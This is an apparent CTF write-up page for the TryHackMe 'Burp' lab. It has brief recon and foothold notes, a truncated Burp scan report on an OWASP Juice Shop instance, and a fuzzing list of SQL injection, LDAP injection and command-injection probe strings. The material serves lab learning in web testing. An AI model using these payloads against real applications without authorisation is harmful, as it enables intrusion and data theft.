---
layout: writeup
title: "/burp"
permalink: "/writeups/tryhackme/burp/"
platform: "TryHackMe"
writeup_type: "room"
room_name: "Burp"
---

<section class="page-hero panel">
  <p class="eyebrow">root@rumais:~# inspect burp</p>
  <h1>Burp</h1>
  <p>Web-facing lab centered on application testing, content discovery, misconfiguration abuse, and foothold development. This page consolidates local notes, recovered artifacts, and cleaned-up workflow guidance with sensitive answers and flags redacted.</p>
</section>

<section class="panel">
  <h2>Room Profile</h2>
  <p>Built from supporting notes and artifacts. This room is grouped under <strong>Web and App Security</strong>.</p>
  <div class="tag-list">
    <span class="tag">Web and App Security</span>
    <span class="tag">2 docx note</span>
  </div>
</section>

<section class="panel">
  <h2>Workflow Focus</h2>
  <p>Web-facing lab centered on application testing, content discovery, misconfiguration abuse, and foothold development. Use the recovered artifacts below as the evidence base for enumeration, access development, and post-exploitation review.</p>
</section>

## Operator Notes

## Recon

- The web application is the main attack surface, so content discovery, login behavior, and hidden paths matter immediately.
- Burp rewards careful note-taking and stepwise validation rather than trial-and-error execution.

## Initial Access

- The intended foothold comes from chaining application flaws, exposed content, or weak credentials into code execution or authenticated access.
- The room path becomes clear once the recovered artifacts and service behavior are linked together.

## Privilege Escalation

- Once the app is compromised, the next step is to stabilize host access and enumerate for the final path to proof material.
- After the foothold, local context matters more than noisy exploitation.

## Defensive Takeaway

- The defensive lesson is that web compromise rarely stays in the web tier when secrets, upload paths, or admin functions are exposed.

## Supporting Notes

### Juiceshop Report

OWASP JuiceShop Unauthenticated
Summary
The table below shows the numbers of issues identified in different categories. Issues are classified according to severity as High, Medium, Low or Information. This reflects the likely impact of each issue for a typical organization. Issues are also classified according to confidence as Certain, Firm or Tentative. This reflects the inherent reliability of the technique that was used to identify the issue.
Confidence
Certain
Firm
Tentative
Total
Severity
High
1
0
0
1
Severity
Medium
0
0
0
0
Severity
Low
12
2
1
15
Severity
Information
99
0
1
100
The chart below shows the aggregated numbers of issues identified in each category. Solid colored bars represent issues with a confidence level of Certain, and the bars fade as the confidence level falls.
Number of issues
0
2
4
6
8
10
12
14
Severity
High
Medium
Low
Contents
- Cross-origin resource sharing: arbitrary origin trusted
1.1. https://ds-juiceshop.herokuapp.com/socket.io/
1.2. https://ds-juiceshop.herokuapp.com/
1.3. https://ds-juiceshop.herokuapp.com/api/Challenges/
1.4. https://ds-juiceshop.herokuapp.com/api/Quantitys/
1.5. https://ds-juiceshop.herokuapp.com/assets/i18n/en.json
1.6. https://ds-juiceshop.herokuapp.com/assets/public/favicon_js.ico
1.7. https://ds-juiceshop.herokuapp.com/assets/public/images/products/artwork.jpg
1.8. https://ds-juiceshop.herokuapp.com/assets/public/images/products/banana_juice.jpg
1.9. https://ds-juiceshop.herokuapp.com/assets/public/images/products/carrot_juice.jpeg
1.10. https://ds-juiceshop.herokuapp.com/assets/public/images/products/coaster.jpg
1.11. https://ds-juiceshop.herokuapp.com/assets/public/images/products/eggfruit_juice.jpg
1.12. https://ds-juiceshop.herokuapp.com/assets/public/images/products/fruit_press.jpg
1.13. https://ds-juiceshop.herokuapp.com/assets/public/images/products/green_smoothie.jpg
1.14. https://ds-juiceshop.herokuapp.com/assets/public/images/products/lemon_juice.jpg
1.15. https://ds-juiceshop.herokuapp.com/assets/public/images/products/melon_bike.jpeg
1.16. https://ds-juiceshop.herokuapp.com/main-es2015.js
1.17. https://ds-juiceshop.herokuapp.com/main-es5.js
1.18. https://ds-juiceshop.herokuapp.com/polyfills-es2015.js
1.19. https://ds-juiceshop.herokuapp.com/polyfills-es5.js
1.20. https://ds-juiceshop.herokuapp.com/rest/admin/application-configuration
1.21. https://ds-juiceshop.herokuapp.com/rest/admin/application-version
1.22. https://ds-juiceshop.herokuapp.com/rest/products/search
1.23. https://ds-juices

### Xplatform Shortened

<>"'%;)(&+
|
!
- ?
/
//
//*
'
' --
1 or 1=1
1;SELECT%20*
1 waitfor delay '0:0:10'--
'%20or%20''='
'%20or%201=1
')%20or%20('x'='x
'%20or%20'x'='x
%20or%20x=x
%20'sleep%2050'
%20$(sleep%2050)
%21
23 OR 1=1
%26
%27%20or%201=1
%28
%29
%2A%28%7C%28mail%3D%2A%29%29
%2A%28%7C%28objectclass%3D%2A%29%29
%2A%7C
||6
'||'6
(||6)
%7C
a'
admin' or '
' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));
' and 1 in (select var from temp)--
anything' OR 'x'='x
"a"" or 1=1--"
a' or 1=1--
"a"" or 3=3--"
a' or 3=3--
a' or 'a' = 'a
&apos;%20OR
' having 1=1--
hi or 1=1 --"
hi' or 1=1 --
"hi"") or (""a""=""a"
hi or a=a
hi' or 'a'='a
hi') or ('a'='a
'hi' or 'x'='x';
insert
like
limit
*(|(mail=*))
*(|(objectclass=*))
or
' or ''='
or 0=0 #"
' or 0=0 --
' or 0=0 #
" or 0=0 --
or 0=0 --
or 0=0 #
' or 1 --'
' or 1/*
; or '1'='1'
' or '1'='1
' or '1'='1'--
' or 1=1
' or 1=1 /*
' or 1=1--
' or 1=1--
'/**/or/**/1/**/=/**/1
‘ or 1=1 --
" or 1=1--
or 1=1
or 1=1--
or 1=1 or ""=
' or 1=1 or ''='
' or 1 in (select @@version)--
or%201=1
or%201=1 --
